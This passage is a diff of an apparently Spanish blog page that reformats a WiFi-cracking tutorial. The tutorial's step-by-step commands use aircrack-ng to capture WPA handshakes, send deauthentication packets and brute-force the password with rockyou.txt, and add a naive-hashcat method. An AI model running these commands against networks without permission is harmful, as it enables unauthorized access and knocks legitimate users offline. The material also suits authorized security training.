@@ -323,135 +323,120 @@
 
 <h2 id="pasos-para-hackear-una-red-wifi">Pasos para hackear una red WiFi</h2>
 
-<ol>
-  <li>
-    <p><strong>Conectar la antena.</strong></p>
-  </li>
-  <li>
-    <p><strong>Instalar Aircrack-ng:</strong></p>
-  </li>
-</ol>
+<p><br />
+<strong>1. Conectar la antena.</strong></p>
+
+<p><br />
+<strong>2. Instalar Aircrack-ng:</strong></p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>sudo apt install aircrack-ng</code></pre>
 </div>
 
-<ol>
-  <li><strong>Cambiar a usuario root:</strong></li>
-</ol>
+<p><br />
+<strong>3. Cambiar a usuario root:</strong></p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>sudo su</code></pre>
 </div>
 
-<ol>
-  <li><strong>Verificar y matar procesos que puedan interferir con la antena:</strong></li>
-</ol>
+<p><br />
+<strong>4. Verificar y matar procesos que puedan interferir con la antena:</strong></p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>airmon-ng check 
 airmon-ng check kill</code></pre>
 </div>
 
-<ol>
-  <li><strong>Iniciar la antena en modo monitor:</strong><br />
-(Utiliza el nombre de la antena que se muestra con el comando <code class="language-plaintext highlighter-rouge">ifconfig</code>.)</li>
-</ol>
+<p><br />
+<strong>5. Iniciar la antena en modo monitor:</strong><br />
+(Utiliza el nombre de la antena que se muestra con el comando <code class="language-plaintext highlighter-rouge">ifconfig</code>.)</p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>airmon-ng start nombreAntena</code></pre>
 </div>
 
-<ol>
-  <li><strong>Escanear las redes disponibles:</strong></li>
-</ol>
+<p><br />
+<strong>6. Escanear las redes disponibles:</strong></p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>airodump-ng nombreAntenaModoMonitor</code></pre>
 </div>
 
-<ol>
-  <li>
-    <p><strong>Identificar el BSSID</strong> de la red a la que se quiere acceder.</p>
-  </li>
-  <li>
-    <p><strong>Capturar paquetes para obtener el handshake:</strong></p>
-  </li>
-</ol>
+<p><br />
+<strong>7. Identificar el BSSID</strong> de la red a la que se quiere acceder.</p>
+
+<p><br />
+<strong>8. Capturar paquetes para obtener el handshake:</strong></p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>airodump-ng -c NumeroCanalDeLaRed --bssid bssid -w nombreArchivosCaps nombreAntenaModoMonitor</code></pre>
 </div>
 
-<ol>
-  <li><strong>Enviar paquetes de desautenticación:</strong><br />
-Mantén abierto el terminal y ejecuta:</li>
-</ol>
+<p><br />
+<strong>9. Enviar paquetes de desautenticación:</strong><br />
+Mantén abierto el terminal y ejecuta:</p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>sudo aireplay-ng -0 9 -a bssid -c estaciónDesautenticada nombreAntenaModoMonitor</code></pre>
 </div>
 
-<ol>
-  <li><strong>Realizar el ataque de fuerza bruta:</strong></li>
-</ol>
+<p><br />
+<strong>10. Realizar el ataque de fuerza bruta:</strong><br />
+Cuando se consiga el handshake, se crean los archivos necesarios. Realizar ataque de fuerza bruta en el archivo <code class="language-plaintext highlighter-rouge">.cap</code>:</p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>aircrack-ng -b handshakeObtenido -w rockyou.txt archivo.cap</code></pre>
 </div>
 
-<ol>
-  <li><strong>Detener la antena en modo monitor:</strong></li>
-</ol>
+<p><br />
+<strong>11. Detener la antena en modo monitor:</strong></p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>airmon-ng stop nombreAntena</code></pre>
 </div>
 
+<hr />
+
 <h2 id="métodos-adicionales-para-obtener-la-contraseña">Métodos adicionales para obtener la contraseña</h2>
 
-<p>Si cuentas con un ordenador con Linux nativo, puedes seguir estos pasos:</p>
-
-<ol>
-  <li><strong>Clonar el repositorio de naive-hashcat:</strong></li>
-</ol>
+<p><br />
+<strong>1. Clonar el repositorio de naive-hashcat:</strong></p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>git clone https://github.com/brannondorsey/naive-hashcat</code></pre>
 </div>
 
-<ol>
-  <li><strong>Compilar el código en el directorio <code class="language-plaintext highlighter-rouge">src</code>:</strong></li>
-</ol>
+<p><br />
+<strong>2. Compilar el código en el directorio <code class="language-plaintext highlighter-rouge">src</code>:</strong></p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>cd naive-hashcat/src
 make</code></pre>
 </div>
 
-<ol>
-  <li><strong>Convertir el archivo <code class="language-plaintext highlighter-rouge">.cap</code> a <code class="language-plaintext highlighter-rouge">.hccapx</code>:</strong></li>
-</ol>
+<p><br />
+<strong>3. Convertir el archivo <code class="language-plaintext highlighter-rouge">.cap</code> a <code class="language-plaintext highlighter-rouge">.hccapx</code>:</strong></p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>cap2hccapx.bin archivo.cap archivoHash.hccapx</code></pre>
 </div>
 
-<ol>
-  <li><strong>Descargar el diccionario rockyou:</strong></li>
-</ol>
+<p><br />
+<strong>4. Descargar el diccionario rockyou:</strong></p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>curl -LO https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</code></pre>
 </div>
 
-<ol>
-  <li><strong>Ejecutar naive-hashcat:</strong></li>
-</ol>
+<p><br />
+<strong>5. Ejecutar naive-hashcat:</strong></p>
 
 <div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
   <pre style="margin: 0;"><code>HASH_FILE=archivoHash.hccapx POT_FILE=archivo.pot HASH_TYPE=2500 ./naive-hashcat.sh</code></pre>
 </div>
+
+<hr />
 
 <h2 id="alternativas-y-recursos">Alternativas y Recursos</h2>
 
@@ -542,11 +527,12 @@ Consulta el repositorio <a href="https://github.com/brannondorsey/wifi-cracking"
       
   <nav class="pagination">
     
-      <a href="/como-crear-un-sistema-linux/" class="pagination--pager" title="Cómo construir tu propio sistema Linux
+      <a href="/como-crear-un-sistema-linux/" class="pagination--pager" title="Cómo personalizar tu propio sistema Linux
 ">Previous</a>
     
     
-      <a href="#" class="pagination--pager disabled">Next</a>
+      <a href="/compartir-archivos-a-nivel-de-red/" class="pagination--pager" title="Transferencia de Archivos entre Parrot y Windows
+">Next</a>
     
   </nav>
 
